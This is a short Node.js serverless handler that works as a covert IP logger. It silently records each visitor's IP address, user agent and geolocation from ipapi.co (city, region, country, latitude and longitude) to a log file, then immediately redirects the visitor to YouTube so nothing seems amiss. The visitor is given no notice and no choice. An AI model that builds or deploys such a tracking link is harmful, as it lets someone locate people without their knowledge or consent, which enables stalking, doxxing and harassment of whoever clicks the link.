const fs = require("fs");
const https = require("https");

module.exports = async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const agent = req.headers["user-agent"];
  const time = new Date().toISOString();

  https.get(`https://ipapi.co/${ip}/json/`, (apiRes) => {
    let data = "";
    apiRes.on("data", (chunk) => (data += chunk));
    apiRes.on("end", () => {
      try {
        const location = JSON.parse(data);
        const log = `${time} | ${ip} | ${agent} | ${location.city || "N/A"} | ${location.region || "N/A"} | ${location.country_name || "N/A"} | ${location.latitude},${location.longitude}\n`;
        fs.appendFileSync("logs.txt", log);
      } catch (err) {
        console.error("Error parsing location data", err);
      }
    });
  });

  res.writeHead(302, { Location: "https://www.youtube.com" });
  res.end();
};